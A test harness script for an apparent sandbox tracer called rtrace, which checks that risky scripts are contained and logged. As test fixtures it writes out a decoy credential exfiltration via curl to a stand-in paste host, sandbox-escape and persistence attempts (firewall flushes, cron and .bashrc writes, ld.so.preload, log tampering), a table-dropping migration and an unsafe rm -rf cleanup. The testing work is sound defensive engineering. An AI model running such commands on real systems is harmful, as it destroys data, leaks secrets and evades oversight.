#!/bin/bash
# Runs inside the systemd container after fixtures/prod/cloud-init.sh.
# Rehearses the three preset shapes with rtrace and checks the ledgers.
set -uo pipefail
export PYTHONDONTWRITEBYTECODE=1
W=/opt/rt/work
install -d "$W"
cd "$W" || exit 1

rehearse() {  # rehearse NAME SCRIPT_FILE SCOPE_JSON
  local name=$1
  printf '%s\n' "$3" > "$W/$name.scope.json"
  /opt/rt/bin/rtrace before --scope "$W/$name.scope.json" > "$W/$name.state0.json" &&
  /opt/rt/bin/rtrace run --script "$2" --wall 60 --mem 512M --pids 256 > "$W/$name.run.json" &&
  /opt/rt/bin/rtrace after --scope "$W/$name.scope.json" > "$W/$name.state1.json" &&
  /opt/rt/bin/rtrace diff "$W/$name.state0.json" "$W/$name.state1.json" "$W/$name.run.json" \
    --scope "$W/$name.scope.json" > "$W/$name.ledger.json"
}

SHOP_SQL=${SHOP_SQL:-/opt/rt/src/fixtures/prod/shop.sql}
SRV_BACKUP="$W/srv-backup.tar"
reseed() { psql -X -q -v ON_ERROR_STOP=1 -d shop -f "$SHOP_SQL" >/dev/null; }
restore_srv() {  # put /srv back exactly as it was before the file rehearsals
  local srv=/srv
  rm -rf -- "${srv:?}"/*
  tar -C / -xpf "$SRV_BACKUP"
}

cat > "$W/reprice_winter.sh" <<'EOF'
psql shop -c "UPDATE prices SET amount = round(amount * 1.10, 2) WHERE category = 'winter' OR category = 'snow' AND active"
EOF
cat > "$W/reprice_safe.sh" <<'EOF'
psql shop -c "UPDATE prices SET amount = round(amount * 1.10, 2) WHERE (category = 'winter' OR category = 'snow') AND active"
EOF
cat > "$W/migrate_0042.sh" <<'EOF'
KEEP=$(cat schema_tables.txt)
for t in $(psql shop -Atc "select tablename from pg_tables where schemaname='public'"); do
  echo "$KEEP" | grep -qx "$t" || psql shop -c "DROP TABLE \"$t\" CASCADE"
done
EOF
printf '%s\n' customers products prices sessions webhooks api_keys > "$W/schema_tables.txt"
cat > "$W/migrate_safe.sh" <<'EOF'
psql shop -v ON_ERROR_STOP=1 <<'SQL'
BEGIN;
DROP TABLE legacy_orders;
COMMIT;
SQL
EOF
cat > "$W/cleanup_safe.sh" <<'EOF'
rm -rf -- /srv/app/tmp/cache/*
psql shop -c "DELETE FROM sessions WHERE expires_at < now()"
EOF
cat > "$W/cleanup.sh" <<'EOF'
APP_ROOT=/srv
CACHE_SUBDIR="${CACHE_SUBDIR}"
rm -rf "${APP_ROOT}/${CACHE_SUBDIR}"/*
psql shop -c "DELETE FROM sessions WHERE expires_at < now()"
curl -s -X POST https://prod-api.internal/purge -d '{"scope":"all"}'
EOF

rehearse reprice "$W/reprice_winter.sh" '{"tables": {"prices": {"max_rows": 31}}, "hosts": []}' || echo "rehearse reprice failed"
rehearse safe1 "$W/reprice_safe.sh" '{"tables": {"prices": {"max_rows": 31}}, "hosts": ["hooks.partner.example"]}' || echo "rehearse safe1 failed"
rehearse safe2 "$W/reprice_safe.sh" '{"tables": {"prices": {"max_rows": 31}}, "hosts": ["hooks.partner.example"]}' || echo "rehearse safe2 failed"
rehearse migrate_safe "$W/migrate_safe.sh" '{"tables": ["legacy_orders"]}' || echo "rehearse migrate_safe failed"
reseed
rehearse migrate "$W/migrate_0042.sh" '{"tables": ["legacy_orders"]}' || echo "rehearse migrate failed"
tar -C / -cpf "$SRV_BACKUP" srv
# Escape attempts from inside the sandbox: each must fail, the in-scope delete must work.
cat > "$W/escape.sh" <<'EOF'
iptables -F 2>&1; echo "R iptables=$?"
iptables -t nat -F 2>&1; echo "R iptables_nat=$?"
ip route add 203.0.113.0/24 via 127.0.0.1 2>&1; echo "R route=$?"
systemd-run --wait --quiet /bin/true 2>&1; echo "R systemd_run=$?"
systemctl stop rt-egress 2>&1; echo "R systemctl=$?"
echo '* * * * * root iptables -F' > /etc/cron.d/rt-escape; echo "R cron=$?"
echo 'iptables -F' >> /root/.bashrc; echo "R bashrc=$?"
# Only where the empty preload list exists; on an older image a write would really land.
if [ -e /etc/ld.so.preload ]; then echo /tmp/x.so > /etc/ld.so.preload; echo "R preload=$?"; else echo "R preload=skipped"; fi
echo x > /opt/rt/bin/rtrace; echo "R tracer=$?"
echo x > /usr/local/bin/rt-escape; echo "R usr=$?"
echo x > /var/log/rt-egress/egress.jsonl; echo "R egress_log=$?"
python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)' 2>/dev/null; echo "R raw=$?"
python3 -c 'import socket; socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 0)' 2>/dev/null; echo "R netlink=$?"
echo "R example=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 https://example.com/)"
echo "R literal_ip=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 https://203.0.113.9/)"
rm -f /srv/app/tmp/cache/cache-00?.bin; echo "R rm=$?"
exit 0
EOF
cat > "$W/exfil.sh" <<'EOF'
cat /srv/app/.env.canary > /dev/null
curl -s -o /dev/null -X POST --data-binary @/srv/app/.env.canary https://paste.partner.example/upload
exit 0
EOF
rehearse exfil "$W/exfil.sh" '{"paths": [], "tables": [], "hosts": []}' || echo "rehearse exfil failed"
rehearse escape "$W/escape.sh" '{"paths": ["/srv/app/tmp"], "tables": [], "hosts": []}' || echo "rehearse escape failed"

# Noise vs the script: drops by a system process are noise (in scope); the script's own are denials.
printf '%s\n' 'true' > "$W/quiet.sh"
systemd-run --quiet --unit=rt-noise-gen --collect -- python3 -c 'import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
for _ in range(150):
    try:
        s.sendto(b"n", ("192.0.2.77", 9))
    except OSError:
        pass
    time.sleep(0.2)'
sleep 1
rehearse noise "$W/quiet.sh" '{"paths": [], "tables": [], "hosts": []}' || echo "rehearse noise failed"
systemctl stop rt-noise-gen 2>/dev/null
cat > "$W/udp_attempt.sh" <<'EOF'
python3 -c 'import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
for _ in range(3):
    try:
        s.sendto(b"x", ("192.0.2.9", 9))
    except OSError as e:
        print("R sendto", e.errno)'
exit 0
EOF
rehearse udp_attempt "$W/udp_attempt.sh" '{"paths": [], "tables": [], "hosts": []}' || echo "rehearse udp_attempt failed"

# Controls (must differ): the same attempts in weaker sandboxes do get through.
PROBE_CAPS="CapabilityBoundingSet=~CAP_NET_ADMIN CAP_NET_RAW CAP_SYS_ADMIN CAP_SYS_MODULE CAP_SYS_PTRACE CAP_BPF CAP_SYS_BOOT CAP_SYS_RAWIO CAP_SYS_TIME CAP_MKNOD"
systemd-run --wait --pipe --collect --quiet -p IPAddressDeny=any -p IPAddressAllow=localhost -p "$PROBE_CAPS" \
  -p ProtectControlGroups=yes -p ProtectKernelModules=yes -p ProtectKernelTunables=yes -p ProtectClock=yes \
  -p "RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6" -- /bin/bash -c 'systemd-run --wait --quiet /bin/true; echo $?' \
  > "$W/control_systemd_run.txt" 2>&1
systemd-run --wait --pipe --collect --quiet -p IPAddressDeny=any -p IPAddressAllow=localhost -- \
  curl -s -o /dev/null -w '%{http_code}' --max-time 5 https://prod-api.internal/purge \
  > "$W/control_no_fake_range.txt" 2>&1
grep -c '"host": "prod-api.internal"' /var/log/rt-egress/egress.jsonl > "$W/control_no_fake_range.records" || true

restore_srv
rehearse cleanup_safe "$W/cleanup_safe.sh" '{"paths": ["/srv/app/tmp"], "tables": ["sessions"], "hosts": []}' || echo "rehearse cleanup_safe failed"
restore_srv
reseed
rehearse cleanup "$W/cleanup.sh" '{"paths": ["/srv/app/tmp"], "tables": ["sessions"], "hosts": []}' || echo "rehearse cleanup failed"

# Limits: memory (OOM kill), pids, wall time.
printf '%s\n' 'python3 -c "b = bytearray(400 * 1024 * 1024); print(len(b))"' > "$W/oom.sh"
printf '%s\n' 'for i in $(seq 1 100); do sleep 3 & done; wait' > "$W/forks.sh"
printf '%s\n' 'sleep 30' > "$W/slow.sh"
/opt/rt/bin/rtrace run --script "$W/oom.sh" --wall 30 --mem 128M --pids 64 > "$W/oom.run.json"
/opt/rt/bin/rtrace run --script "$W/forks.sh" --wall 20 --mem 256M --pids 32 > "$W/forks.run.json"
/opt/rt/bin/rtrace run --script "$W/slow.sh" --wall 2 --mem 64M --pids 16 > "$W/slow.run.json"
echo "sleep 30 processes left after the wall kill: $(pgrep -fc 'sleep 30' || true)"

python3 -I - "$W" <<'PY'
import json, os, sys
sys.path.insert(0, "/opt/rt/lib")
from rt.ledger import compare, ledger_sha256, verify

W = sys.argv[1]
def load(n):
    with open(os.path.join(W, n)) as f:
        return json.load(f)

fails = 0
def check(name, ok, detail=""):
    global fails
    print(("PASS  " if ok else "FAIL  ") + name + (f"  [{detail}]" if detail else ""))
    fails += 0 if ok else 1

canaries = json.load(open("/opt/rt/canaries.json"))["canaries"]
tokens = [c["token"] for c in canaries]

for name in ("reprice", "safe1", "safe2", "migrate_safe", "migrate", "exfil", "escape", "noise", "udp_attempt",
             "cleanup_safe", "cleanup"):
    led = load(f"{name}.ledger.json")
    blob = json.dumps(led)
    check(f"{name}: hash matches content", led["ledger_sha256"] == ledger_sha256(led))
    check(f"{name}: verify() recomputes the same verdict", verify(led, load(f"{name}.scope.json")) == [])
    check(f"{name}: no decoy token value in the ledger", not any(t in blob for t in tokens))
    check(f"{name}: tracer integrity ok", led["integrity"]["ok"], led["integrity"]["issues"])
    print(f"      summary {json.dumps(led['summary'], sort_keys=True)}")

r = load("reprice.ledger.json")
check("reprice: 93 price rows updated", r["rows"].get("prices", {}).get("updated") == 93, r["rows"])
hooks = [e for e in r["egress"] if e.get("host") == "hooks.partner.example" and e.get("path") == "/price-changed"]
check("reprice: 93 webhook POSTs recorded", len(hooks) == 93, len(hooks))
check("reprice: webhooks attributed to shop-webhooks.service", {e["source"] for e in hooks} == {"shop-webhooks.service"})
check("reprice: 0 bytes delivered", r["summary"]["egress_bytes_delivered"] == 0)
check("reprice: rows budget line", any(o["kind"] == "rows_budget" and o["item"] == "prices" for o in r["out_of_scope"]))
check("reprice: out of scope", r["summary"]["verdict"] == "out_of_scope")
check("reprice: UPDATE in sql[]", any(s["statement"].startswith("UPDATE prices") for s in r["sql"]), r["sql"])

s1, s2 = load("safe1.ledger.json"), load("safe2.ledger.json")
check("safe: 31 rows updated", s1["rows"].get("prices", {}).get("updated") == 31, s1["rows"])
check("safe: 31 webhook POSTs", len(s1["egress"]) == 31, len(s1["egress"]))
check("safe: in scope", s1["summary"]["verdict"] == "in_scope", s1["out_of_scope"][:3])
cmp = compare(s1, s2)
check("compare: two safe runs match", cmp["match"], cmp["surprises"][:3])
print(f"      compare counts {cmp['counts']}")

ms = load("migrate_safe.ledger.json")
check("migrate_safe: only legacy_orders dropped, in scope",
      sorted(t for t, ch in ms["rows"].items() if ch.get("dropped")) == ["legacy_orders"]
      and ms["summary"]["verdict"] == "in_scope", (ms["rows"], ms["out_of_scope"][:3]))
cs0 = load("cleanup_safe.ledger.json")
check("cleanup_safe: 150 cache files, sessions -240, no egress, in scope",
      len(cs0["files"]["deleted"]) == 150 and cs0["rows"].get("sessions", {}).get("deleted") == 240
      and cs0["egress"] == [] and cs0["summary"]["verdict"] == "in_scope",
      (len(cs0["files"]["deleted"]), cs0["rows"], cs0["out_of_scope"][:3]))
m = load("migrate.ledger.json")
dropped = sorted(t for t, ch in m["rows"].items() if ch.get("dropped"))
check("migrate: legacy_orders, orders, audit_log dropped", dropped == ["audit_log", "legacy_orders", "orders"], dropped)
out = sorted(o["item"] for o in m["out_of_scope"] if o["kind"] == "table")
check("migrate: orders and audit_log out of scope", out == ["audit_log", "orders"], out)
drops = [s for s in m["sql"] if s["statement"].startswith("DROP TABLE")]
check("migrate: three DROP statements in sql[]", len(drops) == 3, [s["statement"] for s in drops])

c = load("cleanup.ledger.json")
deleted = c["files"]["deleted"]
in_tmp = [p for p in deleted if p.startswith("/srv/app/tmp/")]
check("cleanup: 150 cache files deleted (in scope)", len(in_tmp) == 150, len(in_tmp))
check("cleanup: files outside /srv/app/tmp deleted", c["summary"]["files_out_of_scope"] > 0,
      c["summary"]["files_out_of_scope"])
check("cleanup: sessions -240", c["rows"].get("sessions", {}).get("deleted") == 240, c["rows"])
purge = [e for e in c["egress"] if e.get("host") == "prod-api.internal" and e.get("path") == "/purge"]
check("cleanup: POST prod-api.internal /purge recorded from the script",
      len(purge) == 1 and purge[0]["method"] == "POST" and purge[0]["source"] == "script", purge)
cs = {x["id"]: x for x in c["canaries"]}
check("cleanup: decoy file touched", cs["env-file"]["touched"], cs["env-file"])
check("cleanup: purge URL decoy touched", cs["purge-url"]["touched"], cs["purge-url"])
check("cleanup: exit 0", c["exit"] == 0, c["exit"])
prod_api_log = "/var/log/prod-api/requests.log"
lines = open(prod_api_log).read().splitlines() if os.path.exists(prod_api_log) else []
check("cleanup: fake live API received nothing", lines == [], len(lines))
e = load("escape.ledger.json")
marks = dict(l[2:].split("=", 1) for l in e["output"]["stdout_tail"].splitlines() if l.startswith("R "))
print(f"      escape markers {marks}")
for k in ("iptables", "iptables_nat", "route", "systemd_run", "systemctl", "cron", "bashrc", "preload", "tracer",
          "usr", "egress_log", "raw", "netlink"):
    if marks.get(k) == "skipped":
        print(f"      escape: {k} skipped (file absent on this image)")
        continue
    check(f"escape: {k} refused inside the sandbox", marks.get(k) not in (None, "0", "127"), marks.get(k))
check("escape: in-scope delete works", marks.get("rm") == "0", marks.get("rm"))
check("escape: curl https://example.com answered by the recorder", marks.get("example") == "503", marks.get("example"))
ex = [x for x in e["egress"] if x.get("host") == "example.com"]
check("escape: example.com recorded, 0 bytes delivered", len(ex) == 1 and ex[0]["delivered"] == 0, ex)
print(f"      literal IP curl -> {marks.get('literal_ip')}; recorded: {[x for x in e['egress'] if x.get('host') == '203.0.113.9']}")
check("escape: integrity ok, every check unchanged", e["integrity"]["ok"], e["integrity"])
print(f"      integrity checks {e['integrity']['checks']}")
created = e["files"]["created"] + e["files"]["modified"]
check("escape: nothing created or modified outside the delete", created == [], created)
check("escape: 9 cache files deleted", len(e["files"]["deleted"]) == 9, len(e["files"]["deleted"]))
ctl = open(os.path.join(W, "control_systemd_run.txt")).read().strip()
check("control: with the probe's property set systemd-run from inside works (the hole is real)", ctl.endswith("0"), ctl)
nf = open(os.path.join(W, "control_no_fake_range.txt")).read().strip()
check("control: without the fake range allowed, the recorded call cannot complete", nf == "000", nf)
x = load("exfil.ledger.json")
xc = {c["id"]: c for c in x["canaries"]}["env-file"]
check("exfil: decoy token sent outward is flagged", xc["exfil_attempt"] is True, xc)
paste = [e for e in x["egress"] if e.get("host") == "paste.partner.example"]
check("exfil: POST paste.partner.example recorded, 0 delivered", len(paste) == 1 and paste[0]["delivered"] == 0, paste)
audit_on = os.system("systemctl is-active --quiet auditd") == 0
if audit_on:
    check("exfil: auditd saw the decoy file read", "read" in xc["evidence"], xc["evidence"])
else:
    print("      exfil: auditd not active here, read evidence not checked")
nz = load("noise.ledger.json")
check("noise: a system process dropping packets leaves the script in scope",
      nz["summary"]["verdict"] == "in_scope" and nz["system_noise"]["udp_packets"] >= 1
      and nz["egress_denied"] == {"packets": 0}, (nz["summary"], nz["system_noise"], nz["out_of_scope"][:3]))
ua = load("udp_attempt.ledger.json")
# Where the kernel log has the nat connect line (a twin; not a container network namespace) the flow is
# also listed as one blocked UDP egress entry to 192.0.2.9:9, which adds one "host" entry. Nothing else.
ua_kinds = sorted((o["kind"], o["op"]) for o in ua["out_of_scope"])
ua_listed = ua_kinds == [("host", "udp:9"), ("network", "denied")]
check("noise: the script's own UDP attempt is a denial, out of scope",
      ua["egress_denied"]["packets"] >= 3 and ua["summary"]["verdict"] == "out_of_scope"
      and ua_kinds in ([("network", "denied")], [("host", "udp:9"), ("network", "denied")])
      and ua["egress"] == ([{"kind": "udp", "host": "192.0.2.9", "port": 9, "bytes_attempted": 0, "delivered": 0,
                             "source": "script", "blocked": "dropped by the firewall"}] if ua_listed else [])
      and ua["summary"]["egress_bytes_delivered"] == 0,
      (ua["egress_denied"], ua["out_of_scope"], ua["egress"]))
print(f"      noise: system_noise {nz['system_noise']}, drop_log {nz['drop_log'][:2]}; "
      f"script denied {ua['egress_denied']}, drop_log {ua['drop_log'][:2]}, ip_accounting {ua['ip_accounting']}")
o = load("oom.run.json")["limits"]
check("limits: memory hog is OOM-killed", o["oom"] and load("oom.run.json")["exit"] != 0,
      {k: o[k] for k in ("oom", "oom_kills", "peak_mem_mb", "mem_max_mb")})
fk = load("forks.run.json")["limits"]
check("limits: fork limit hit is counted", fk["pids_limit_hit"] > 0, fk["pids_limit_hit"])
sl = load("slow.run.json")
check("limits: wall limit kills the scope", sl["limits"]["wall_exceeded"] and sl["limits"]["wall_s"] < 10,
      {k: sl["limits"][k] for k in ("wall_exceeded", "wall_s")} | {"exit": sl["exit"]})
print(f"RESULT fails={fails}")
sys.exit(1 if fails else 0)
PY
